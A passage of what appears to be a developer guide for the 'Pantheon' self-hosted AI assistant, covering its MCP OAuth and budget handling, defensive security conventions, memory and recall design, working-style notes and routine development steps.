3. Fetch AS metadata: tries `/.well-known/oauth-authorization-server` (RFC 8414) first, falls back to `/.well-known/openid-configuration` (added to MCP in spec 2025-11-25 for OIDC providers)
4. Dynamic Client Registration (RFC 7591) — register a public client with `token_endpoint_auth_method=none`, redirect URI `http://localhost:8000/api/mcp/oauth/callback`. The AS may force-downgrade to a confidential client and return a `client_secret`; we honor it and store it in the vault.
5. Build authorize URL with PKCE S256 and the `resource` indicator (RFC 8707); state is stashed in `_pending` in `backend/mcp_client/oauth.py` with 10-min TTL
6. Frontend opens it in a new tab → user signs in → AS redirects to `/api/mcp/oauth/callback?code=…&state=…`
7. Callback handler matches state → exchanges code → persists tokens → reconnects MCP client

The callback path is in `_PUBLIC_PATHS` in `backend/main.py` because external authorization servers can't carry Pantheon's session. Security comes from the PKCE `code_verifier` + `state` parameter, not Pantheon's auth layer.

Tokens live in the vault keyed by:
- `mcp_oauth_tokens__<name>` — `{access_token, refresh_token, expires_at, token_type, scope, issued_at}` (+ `refresh_failed` after a rejected refresh)
- `mcp_oauth_client_secret__<name>` — present only if DCR forced a confidential client

Per-connection config gains `auth_type` and an `oauth` block (issuer, token_endpoint, client_id, scopes, resource, registration_endpoint, prm_url). Connection list output includes `oauth_status: "ok" | "needs_auth"` so the frontend can decide whether to show the **Authorize** / **Re-auth** badge.

**Refresh.** Each OAuth-enabled `MCPClient` receives a `token_getter` async callback (`manager._make_oauth_token_getter`). It runs before requests to populate `Authorization: Bearer …` and pre-emptively refreshes within 60 s of `expires_at`. On HTTP 401, `_send_jsonrpc` calls it with `force_refresh=True` plus the rejected token and retries once (the loop's `max_attempts` gets one extra attempt when a token_getter is present). Refreshes are serialized per connection (`_REFRESH_LOCKS`), and a caller whose rejected token was already rotated just uses the new one, so concurrent 401s refresh once (rotation-safe). A refresh rejected by the AS (HTTP 400/401/403, `invalid_grant`) sets `refresh_failed` → `oauth_status: needs_auth`; so does an expired token with no `refresh_token`. Network errors leave tokens alone.

**Structured tool outputs (spec 2025-06-18+).** `MCPClient.call_tool` returns `{"text": str, "structured": dict|list|None, "is_error": bool}`. The manager's `_format_tool_result` renders text first, then appends any `structuredContent` inside a `<structured-output>…</structured-output>` block (capped at 50 KB) so the LLM gets both the human-readable summary and the typed payload. `outputSchema` from `tools/list` is preserved on `get_discovered_tools()` (as `output_schema`) for UI inspection but is not forwarded to the LLM (OpenAI's function-call schema has no equivalent slot).

**MCP tool names go through `mcp_client.client.tool_function_name`.** It produces `mcp_<conn>_<tool>`, or for names over 64 characters a 55-character prefix plus a hash. `resolve_tool_call` maps names back through the same function, so never build `f"mcp_{…}"` by hand.

**Find MCP tools by what they do, not by connection name.** `MCPManager.find_tool` accepts a pattern (`mcp_*_fetch_transcript`), a bare tool name, or a prefixed name whose connection has since been renamed. `missing_tools` checks a skill's `requires_mcp` the same way. The YouTube adapter and the legacy `save_transcript_artifact` use it, so any connection name works.

**MCP `save_*` tools are NOT artifact tools.** A tool like `mcp_<conn>_save_to_library` writes to that MCP server's external storage, which Pantheon cannot see. Always use `save_to_artifact` (or `ingest_source` for video transcripts) for Pantheon persistence.

**MCP call budgets (was Tavily-only credits).** `mcp_client/budget.py` meters every MCP call into `data/db/mcp_usage.db`, and `MCPManager.execute_tool` / `call_tool_raw` enforce it.
- **Limits:** `cfg["budget"] = {daily, monthly, costs?, preset?}` on the connection config, where 0 means unlimited. Past 80% of a limit, results carry a pacing note.
- **Costs:** 1 per call by default. `PRESETS` (currently `tavily`, detected from the connection's name or URL unless `budget.preset` names one) provides credit costs keyed on arguments. Per-tool rules in `budget.costs` override the preset.
- **Over the limit:** the call is refused. Search tools that have a `query` argument fall back to the built-in `web_search`, and so does a search tool whose connection isn't connected. `call_tool_raw` raises instead.
- **API:** `GET/PUT /api/mcp/connections/{name}/budget` (for Tavily, GET also returns the service's own `/usage` figures) and `POST …/budget/reset {period}`.
- **Migration:** `budget.migrate_tavily` ran once at startup (vault `mcp_budget_migrated_v1`). It moved the vault `tavily_*_limit` keys and this month's `tavily_usage.json` onto the Tavily connection.

## Security conventions

**Auth is a random, expiring session in an HttpOnly cookie.** `/api/auth/login` issues a random token (hash stored in `data/db/auth_sessions.db`, `AUTH_SESSION_DAYS`, default 30) and sets the `pantheon_session` cookie (`HttpOnly; SameSite=Strict`). The browser never sees the token; `<img src>`, `<a download>`, `fetch()` and the WebSocket all authenticate via the cookie. API/script clients can send `Authorization: Bearer <token>` instead. Tokens are **never** accepted from the query string — don't add `?token=` support. Changing `AUTH_PASSWORD`/`SECRET_KEY` invalidates all sessions. `password_matches()` is the one password check (login, update gate). With `AUTH_PASSWORD` empty, auth is off and only IP literals, single-label and private-TLD hosts or `ALLOWED_HOSTS` are served (DNS-rebinding guard, 421 otherwise).

**WebSockets bypass the HTTP auth middleware.** `@app.middleware("http")` never runs for WebSocket scopes. Every WebSocket endpoint must call `api.auth.authorize_websocket(ws)` before `accept()` — it checks the session cookie/Bearer header and rejects cross-site `Origin`s.

**Public default secrets → local only.** `api.auth.insecure_defaults()` flags `VAULT_MASTER_KEY`/`SECRET_KEY`/`AUTH_PASSWORD` still set to config.py defaults or `.env.example` placeholders; then `remote_blocked` makes the HTTP middleware (503) and `authorize_websocket` refuse any client that isn't loopback (a proxy's `X-Forwarded-For`/`X-Real-IP`/`Forwarded` counts as remote). `ALLOW_INSECURE_DEFAULTS=true` overrides. Change the vault key with `scripts/rotate_vault_key.py` (`SecretsVault.rotate_master_key`: re-encrypts every secret in one transaction, refuses if any can't be decrypted, backs up vault.db and .env).

**Vault KDF v2.** `SecretsVault` derives its key with PBKDF2-SHA256 (600k) over the full `VAULT_MASTER_KEY` and a random per-vault salt in `vault_meta`. v1 vaults (truncated key, fixed salt) are re-encrypted in one transaction on first open.

**Secrets never follow user-set URLs by name.** Search providers may only reference `*_api_key` / `search_key__*` vault keys (`agent.search_providers.is_search_key_name`, checked on save and on use; LLM keys excluded). `POST /api/jobs` accepts only `CREATABLE_JOB_TYPES` (autonomous_task, iteration_loop, coding_task).

**Untrusted names → paths.** Use `utils.paths` (`is_within`, `check_project_id`, `safe_filename`) — never `str(p).startswith(str(base))`. Project ids that reach the filesystem go through `check_project_id` (raises `InvalidProjectId` → 400). Conversion formats go through `document_converter.validate_format`.

**Outbound fetches go through `utils.net.safe_http_get`.** It blocks non-public addresses on every redirect hop and connects to the IP it validated (Host header + TLS SNI keep the real hostname), so DNS rebinding between check and connect doesn't work. Behind an HTTP(S) proxy it skips pinning (the proxy resolves). Don't add `httpx.get(model_chosen_url, follow_redirects=True)` or `trafilatura.fetch_url`. `ALLOW_PRIVATE_FETCH=true` opts out.

**Browser tools are guarded per request.** `browser_tools._guard_route` is installed on every Playwright context: all requests (subresources, fetch/XHR) to non-public hosts are aborted, and navigations are fetched without following redirects so a redirect to an internal host is refused before it's requested. Tools also re-check the page's final URL before returning content. `BROWSER_ENABLED` turns them on; `BROWSER_EXECUTABLE_PATH` points Playwright at a system Chromium.

**Untrusted HTML/SVG rendering.** Workspace HTML renders via `SandboxedHtml` (srcDoc + `sandbox="allow-scripts"`, no `allow-same-origin`, no token in URL). Anything going into `innerHTML`/`dangerouslySetInnerHTML` goes through DOMPurify first.

**Git credentials never go in URLs.** Use `_git_auth_env(token)` (http.extraheader via `GIT_CONFIG_*` env) with the clean `https://github.com/...` URL.

**Skills are scanned before they reach the prompt.** A user skill with no valid scan (new, edited or hand-written) gets the static layers when the registry loads. `create_skill` runs the full scan. `scanner.INSTRUCTION_PATTERNS` flags injection phrasing in `instructions.md`.

**Messaging bot allowlists are deny-by-default.** Empty `telegram_allowed_chat_ids` / `slack_allowed_channel_ids` / `discord_allowed_guild_ids` / `matrix_allowed_room_ids` / `mattermost_allowed_channel_ids` = nobody.

## Other conventions and gotchas

**Storage layers.** Two distinct things, NOT interchangeable:
- **Artifacts** — durable, indexed, searchable. SQLite + blob. Tools: `save_to_artifact`, `read_artifact`, `list_artifacts`, `update_artifact` (transcripts: `ingest_source`). `save_to_artifact`, `list_artifacts`, `read_artifact` and `index(target="artifact")` share one path normalization: bare folder names get the project slug prepended — pass `path_prefix='NBJ/'`, not `'default-project/NBJ/'`.
- **Workspace files** — ephemeral scratch on disk. Tools: `read_file`, `write_file`, `list_workspace_files`. Don't use these for anything you want to keep.

**DB path canonical location.** ALL SQLite stores live under `settings.db_dir` which resolves to `data/db/`. Don't use relative `data/foo.db` paths — they'll resolve to CWD-relative which on the dev box ends up at `backend/data/`.

**SQLite PRAGMAs.** Every long-lived store routes connections through `apply_sqlite_pragmas(conn)` in `backend/db_utils.py`, which sets `journal_mode=WAL`, `synchronous=NORMAL`, and `foreign_keys=ON`. Don't add a new SQLite store without calling this helper at its `_connect`/`_init_db` site — the WAL setting persists in the DB header but `synchronous=NORMAL` is per-connection and is where most of the write-throughput win comes from.

**Project delete and export cover every per-project store (`api/project_purge.py`).** `DELETE /projects/{id}` used to remove only `data/projects/<id>` and the projects.json entry; conversations, notes, graph, artifacts, jobs, schedules and both Chroma collections stayed (a harness that created and deleted 133 projects left 438 conversations and ~280 MB of vectors, 2026-10-02). `project_purge.inventory()` counts and `purge()` removes: episodic tables, graph, artifacts + versions + previews (content-addressed blobs only when no other artifact references them), file index, merge proposals, phase_g tables, sources.db repo binding, jobs (409 while one runs; queued ones are cancelled) and APScheduler jobs, both Chroma collections (by collection name - a local dir is removed only when empty, because project `episodic-foo`'s semantic dir is project `foo`'s episodic dir), project files, vault keys (`skill_discovery_<id>`, channel mappings, default messaging project) and skill state. `GET /projects/{id}/delete-preview` feeds the UI's `DeleteProjectModal` (counts + "I understand" checkbox). **A new per-project store must be added to project_purge.py and to export/import.** Export has an `artifacts` component (rows + versions + `artifacts/blobs/<rel>`); import gives artifacts fresh ids, checks each blob's sha256 and skips existing paths. Import replaces row ids (and chat session ids) that another project owns - before, importing a copy next to its source silently dropped its conversations, notes and graph while reporting them imported. The default project's workspace is `data/workspace` (`project_export.workspace_dir`).

**Store-owned SQL.** Code that needs another component's data calls that store's method, e.g. `EpisodicMemory.set_conversation_title` / `merge_conversation_metadata` / `delete_conversation` / `project_stats`, or `GraphMemory.edges_along_path` / `count_nodes`. It doesn't open that store's DB file. Export and self-doc open DBs read-only (`project_export._connect_ro`). Runtime-setting readers live in `utils/runtime_settings.py`, not in routers.

**Config.** `config.Settings` uses plain defaults: the env var is the field name upper-cased. `CHROMA_HOST` empty means embedded Chroma. `LLM_*`, `EMBEDDING_MODEL` and `EMBEDDING_BASE_URL`/`EMBEDDING_API_KEY` are only bootstrap fallbacks used when no route exists (`models.provider._fallback_embedder` never sends the LLM key to the embedding host). Job/browser/sandbox knobs (`JOB_*`, `BROWSER_*`, `PANTHEON_SANDBOX`, `FC_*`, `TOOL_RESULT_MAX_CHARS`) are read with `os.getenv`, not Settings.

**Outbound HTTP to LLM/embedding/rerank/MCP endpoints uses `utils.http.pooled_client(timeout=…)`** (one keep-alive pool per event loop, closed on shutdown). Don't reintroduce `async with httpx.AsyncClient()` per request on hot paths.

**Chat settings: one read path.** `utils/chat_settings.py` — `tone_weight` (minimal|balanced|strong; global vault key `personality_weight`), `context_focus` (broad|balanced|focused), `memory_recall` (bool; global `memory_recall_enabled`) — per-project override in phase_g.db `project_settings` (NULL = inherit; the db's other old tables were never used and are dropped when empty) over the global vault values Settings writes; `skill_discovery` (off|suggest|auto) stays in vault `skill_discovery_<project>` (what chat and the bots read). `AgentCore.chat` reads `effective(project_id)`; the chat-header toggles and Project Settings write `PUT /api/projects/{id}/settings` (`null` clears an override). The frontend never keeps its own copy — it loads `effective` on project switch.

**Personality presets (was "personas").** A preset is only a `soul.md` voice (JSON in `backend/data/personas/` or `data/personas/`; API `/api/personas`). `POST /personas/{id}/apply/{project}` writes `personality.with_commitments(soul)`, which appends the global soul's Key Commitments. `POST /personality/reset?project_id=` drops a project's override so it follows global again (without `project_id` it restores the bundled files).
- Projects follow global by default. Pan (identical to the global soul) is no longer a preset.
- `agent.personality.migrate_persona_overrides` ran once at startup (via `api.personas.migrate_project_personas`, vault `persona_presets_migrated_v1`). It removed untouched auto-applied Pan copies and added Key Commitments to untouched preset copies.
- Group-chat mode (`active_personas`) and `custom_soul` are gone. The UI lives in Settings → Personality, Project Settings and the project cards; there is no Personas page (`/personas` redirects).

**Firecracker mounts the workspace.** `SandboxConfig.workspace_dir` becomes an ext4 disk at `/workspace` in the VM and is mirrored back after the run. Exit codes come from a console marker (`_parse_console`), not Firecracker's own exit code.

**Frontend conventions.**
- **Markdown:** always render it with `components/Markdown.jsx` (remark-gfm + mermaid). Pass a `components` override for per-site tweaks — never configure ReactMarkdown directly.
- **API errors:** the axios interceptor rejects with an `Error` whose `.message` is the readable API error (it also carries `.status`, `.data` and `.response`). Use `e.message`, not `e.response.data.detail`.
- **Notifications:** use `addNotification({type, message})` toasts (store), not `alert()`.
- **Colors:** `brand` and the in-between grays (250/350/750/850) are defined in `tailwind.config.js`. An undefined color step silently generates no CSS, so add it there before using it.
- **Links:** use router `<Link>` for internal links. A raw `<a href>` reloads the page and drops the chat WebSocket.
- **Lazy loading:** pages are `React.lazy`; heavy libs load via dynamic `import('mermaid')` / `import('jspdf')`. Keep new heavy deps behind dynamic imports.

## Design rationale (decisions outside reviewers often misread)

These are deliberate architectural calls. If a code review recommends reversing one, the burden is on the recommendation, not the code.

**Memory recall is not pattern-gated.** Every chat turn runs `mgr.recall` across episodic/semantic/graph unless the user turned `memory_recall` off for the project; what comes back is filtered by relevance, not by phrasing. Reviewers sometimes suggest gating it on phrases like "what did we discuss" to save latency — don't. The whole product premise is implicit continuity: the user should be able to refer to last week's work without saying the magic words. Pattern-gating silently breaks the exact cases that matter most. If recall latency is the actual concern, lower `limit_per_tier` or the timeouts (`PRE_RECALL_TIMEOUT_SECONDS`, `RERANK_TIMEOUT_SECONDS`) — don't gate on phrasing.

**Skills are markdown recipes, not executable code.** A "skill" is `skill.json` + `instructions.md` that the agent reads as prompt context. There is no skill executor and skills never run in a subprocess. Recommendations to add WASM/process isolation for skills are confusing skills with arbitrary user code. (`backend/sandbox/` exists, but it isolates the `code_execute` tool, not skills.) Imported skills go through `skills/scanner.py` because their text becomes prompt. See `backend/skills/` and `docs/skills.md`.

**No in-app conversation summarization.** Long histories are trimmed by token budget in whole blocks (`agent/history.py`) and dropped turns come back through recall; the app does not synthesize a summary turn. Adding one in `AgentCore.from_session` would rewrite the prompt prefix and risks lossy double-summarization. Persistent context lives in episodic memory + the recent-jobs block (`consolidate_memory` is the explicit, user/agent-triggered path into semantic/graph).

**Skill resolver is keyword-based, deliberately.** `skills/resolver.py` uses keyword scoring against installed-skill triggers — not per-turn similarity search. The reason: an embedding call per chat turn costs more latency than a static skill list does in tokens, and the keyword resolver gives deterministic, debuggable matches. The available-skills block in the system prompt is the right shape.

**Recent-jobs block is capped low.** `AgentCore._build_recent_jobs_block` shows the last 5 jobs (24h window) — enough for "you started X earlier" continuity without bloating the system prompt. Don't raise it without a concrete reason; the value is anti-confabulation, not exhaustive history.

**Frontend is componentized.** `components/Settings.jsx` is only the tab shell; every tab lives in `components/settings/` (LLMs: endpoints/routing/router/usage/tuning, RAG, channels, personality, skill hubs, tasks + job runs, security + sandbox, secrets, system update). `components/Chat.jsx` is a composition shell over `components/chat/` (`useChatSocket`, `useChatAttachments`, `Message`, `ToolCallBlock`, `ChatComposer`, `ChatHistoryDrawer`, `SaveToArtifactModal`). Reviewers who recommend "split Settings/Chat" are looking at stale state — verify against the current tree before acting.

**Single-user, single-process.** Pantheon does not have multi-tenant request fan-out, separate workers, or horizontal scaling. APScheduler + JobWorker share the FastAPI process by design. Recommendations that assume Pantheon needs the patterns of a multi-tenant SaaS (request-scoped DB pools, per-tenant isolation, queue/worker split) are misapplying tuatha's architecture here.

## Memory, recall and history

- **Episodic** — chat history + task logs. Searchable by content/timestamp. Persistent. `get_history` returns the newest `limit` messages (oldest-first order).
- **Semantic** — embedded chunks from indexed artifacts and workspace files. Topic-label embeddings stored here too with `metadata.kind=topic_node`.
- **Graph** — typed nodes + edges. Source / video / topic / person / concept node types. Edges: PRODUCES, DISCUSSES, FEATURES_SPEAKER, SEMANTICALLY_SIMILAR_TO.
- **Working** — in-process `AgentCore.working_memory`; not persisted. (`memory/working.py` is gone; `remember(tier="working")` from old callers becomes a session-tagged episodic note.)
- **Archival** — markdown notes + project summary under `<data_dir>/projects/<id>/notes` (Memory → Archival tab). Always the configured data dir; `migrate_stray_notes()` at startup moves notes an older build wrote under a CWD-relative `data/`.

`mgr.recall(query, tiers=[...])` searches across them and returns provenance-tagged hits: `[semantic/artifact] ... ↳ source: NBJ/... id=... tags=[...]` for artifact chunks, `[semantic/file:foo.md]` for workspace file chunks, `[episodic session=abc12345 ts=...]` for chat history, `[graph:concept] ...` for graph nodes.

**Writing memory.** `MemoryManager.consolidate_session()` (tool `consolidate_memory`, `POST /api/memory/consolidate?session_id=`) summarises + extracts from the session's recent persisted messages; it needs a real session id. `remember(tier="graph")` runs the conversation extractor (`min_messages=1`) on the text so entities/relationships land in the graph.

**Graph idempotency.** `graph.add_edge` is idempotent on `(project_id, node_a_id, node_b_id, relationship)`, and `add_node` on `(project_id, label)`, so re-running the typed-topics extractor doesn't pile parallel edges. Graph merges are one transaction (`GraphMemory.merge_nodes`) and drop the absorbed label's topic embedding so it can't be resurrected by the next similarity pass.

**Embeddings.** `ModelProvider.embed` raises on failure (no zero vector); callers skip/fall back (semantic search → `[]`, episodic → LIKE search). Batch with `ModelProvider.embed_many` + `SemanticMemory.store_many` (the indexer and artifact embedder store chunks in one call); `embed()` memoizes short texts (queries, topic labels) in a 512-entry LRU. Deletes use metadata filters: `SemanticMemory.delete_where(where)`; `strip_artifact` matches both `artifact_id` (embedder chunks) and `fm_artifact_id` (FileIndexer chunks); `index_text` deletes a path's old chunks before re-storing.

**Pre-recall skips what the prompt already carries.** `AgentCore.chat` passes `in_context=` (the new message plus the history actually sent) to `recall`; episodic hits with the same text are dropped before the per-tier cut. Chat saves the user message to episodic before the agent runs, so without this the top episodic hit was the question itself, and the current session's turns crowded out older sessions — the only ones recall adds anything for. Turns dropped by the history budget are not in that set, so recall can bring them back.

**Pre-recall has a relevance floor.** `_rerank` stores scores on a 0-1 scale (`_as_probabilities`: llama.cpp and TEI-raw rerankers return cross-encoder logits, which are sigmoid-mapped; the raw value stays in `rerank_raw`), so thresholds and the context-focus recency blend mean the same thing for every reranker. `AgentCore` passes `min_relevance=RECALL_MIN_RELEVANCE` (0.05): reranked items below it are not injected, and small talk gets no memories at all. The floor is deliberately low — with bge-reranker-v2-m3 a relevant but tersely-worded note ("User's dog is called Rufus" for "What's my dog's name?") scored 0.14, unrelated items < 0.05. No floor when the rerank failed or timed out, and none for the agent's own `recall` tool.

**Long conversations: history has a token budget (`agent/history.py`).** Each turn rebuilds the agent from the newest 200 messages; `AgentCore.chat` sends only the newest ones within `HISTORY_TOKEN_BUDGET` (0 = auto: a quarter of the agent model's context window, clamped 2K-24K, 24K when unknown; <0 disables). Older messages are dropped in whole blocks of 20, aligned to their absolute position in the session (`working_offset`, from `EpisodicMemory.count_messages`), so the cut moves only every ~10 turns and the history stays a stable prefix for the KV cache in between. The `<context>` block tells the model how many older messages are not shown. Never slide the window one turn at a time — that rewrites the prompt prefix every turn.

**Earlier turns come back by similarity, not rerank.** When the session has more than `SESSION_RECENT_MESSAGES` (6) messages or the budget dropped some, `recall(session_fallback=<session>)` also searches this conversation's messages (`EpisodicMemory.search_messages(session_id=)`) and adds up to 2 — excluding the newest 6 and the question — with embedding similarity >= `RECALL_SESSION_MIN_SIMILARITY` (0.45), labelled `[earlier in this chat, ...]`. The reranker can't do this job: it ranks the right turn first for "did I mention a speech earlier?" but scores it ~0.003 (a question about the conversation, not about the speech), far below the relevance floor. Measured similarities: relevant 0.49-0.75, unrelated <= 0.40. It deliberately also repeats relevant OLDER turns that are still in the prompt: with thinking off, a 9B model missed a fact ~20 turns back in a 17K-token history 2 times in 5, and found it every time once it sat next to the question.

**Per-turn context goes in the user message, not the system prompt.** The recalled items and the current time are rendered by `prompts.render_turn_context` as a `<context>` block in front of the new user message (labelled by provenance: `[note]`, `[user said]`, `[your earlier reply]`, `[graph]`, `[archive]`); how to treat that block is explained once, statically, in the system prompt's `## Recalled memory` section (`MEMORY_GUIDANCE`). Working memory and episodic keep the plain message. This keeps tools + system prompt + history a byte-identical prefix from turn to turn, so llama.cpp / vLLM prefix caching reuses it — when memories sat mid-system-prompt, every turn's first call recomputed the ~3K tokens after them plus the whole history. Don't put anything per-turn (times, counters, recalled data) into `build_system_prompt`; the recent-jobs block is appended last because it changes with job state.

## Cross-artifact similarity + merge proposals

When `auto_link_similarity=True` on an adapter, after `index_artifact` runs, the similarity pipeline (`sources/similarity.py`):

1. Embeds each topic label into the semantic collection with `kind=topic_node` metadata
2. For each topic, finds type-compatible neighbors (concept↔concept, technology↔framework, vendor↔organization, market↔market_segment) above cosine 0.86 (`DEFAULT_LINK_THRESHOLD`)
3. Adds `SEMANTICALLY_SIMILAR_TO` edges in both directions (graph traversal direction-agnostic)
4. For matches above 0.92 (`DEFAULT_MERGE_THRESHOLD`), queues a merge proposal in the `topic_merge_proposals` table (`merge_proposals.db`)

Merges are NEVER auto-applied. The user reviews via `merge_topics(action="list")` and explicitly approves with `merge_topics(action="approve", proposal_id, canonical_label)`. The merge then rewrites every edge touching the deprecated node to point at the canonical, deletes the deprecated node, and marks the proposal as `merged`. Idempotent — re-approving returns "already merged".

## Things explicitly NOT done yet

- JS-rendered web pages fail trafilatura (need playwright fallback when you hit a real failure)
- Image-only / scanned PDFs need OCR
- No CI configured (tests run manually)
- Forum / podcast / github adapters need real-traffic shakedown (only smoke-tested at registry / parsing level so far)
- Reddit OAuth flow — the public `.json` endpoints get 403'd from non-residential IPs; today the workaround is `extras['raw_payload']` (paste the JSON from a logged-in browser). Phase C item: register a Reddit app, store client credentials in the vault, hit `oauth.reddit.com` with a bearer token
- Per-project source-adapter scoping deferred (currently global registry)
- UI panel for merge-proposal review (agent-tool only currently)

## Working style

- Brent prefers concise responses. Skip preambles.
- He runs deploy commands himself; output the command, don't try to ssh.
- After making code changes, give him the rebuild command — don't pretend the change is live.
- If something seems suspect (an empty job result, a UI showing stale state), grep the code before guessing — Pantheon has many small layers and surface-level reasoning often gets the wrong layer.
- When a fix is structural (e.g. wrong abstraction, missing field), say so even if it means more work — Brent would rather pay the architectural cost once than carry the debt.
- Don't pile new features on top of broken ones; fix the foundation first.

## Common dev tasks

**Add a new agent tool:**
1. Pick the domain module in `backend/agent/tools/` (memory, files, artifacts, web, sources, tasks, skills, images, code, github, git, finance) or add one (import it in `agent/tools/__init__.py`)
2. Add the schema to that module's `SCHEMAS` and the name to `_ORDER` in `agent/tools/__init__.py` (the order the model sees)
3. Write the handler: `@tool("name") async def _tool_name(ctx: ToolContext, tool_name, tool_args)` — `ctx` carries `memory_manager`, `project_id`/`effective_project`, `session_id`, `last_assistant_text`, `interactive`, `host_exec`. Host-exec tools also go in `HOST_EXEC_TOOLS`
4. Regenerate `docs/tools.md`: `.venv/bin/python scripts/gen_tools_doc.py` (a test fails if it's stale)
5. Bump version in `frontend/package.json` (+ lockfile)
6. Restart backend

**Add a new source adapter:**
1. Create `backend/sources/adapters/<name>.py`
2. Subclass `SourceAdapter` (or one of the `_*AdapterBase` classes, e.g. `_BlogAdapterBase`, `_PDFAdapterBase`) — at minimum implement `fetch()` and set class attrs
3. Call `register_adapter(YourClass())` at module import
4. Import the module in `backend/sources/adapters/__init__.py`
5. Optionally add a specialized extractor in `backend/sources/extraction.py`

**Add a new extractor strategy:**
1. Subclass `LLMDefaultExtractor` (so you inherit the JSON-recovery + diagnostics logic) and set `name`
2. Define your prompt and parse the response into `ExtractedFields(topics, speakers, claims, status, frontmatter_additions)`
3. Call `register_extractor(YourClass())`
4. Reference it from an adapter via `extractor_strategy = "your_name"`

**Backfill similarity over existing artifacts:**
`link_topic_similarity(path_prefix="youtube-transcripts/")` — runs `link_artifact_topics` over each existing artifact under that prefix.
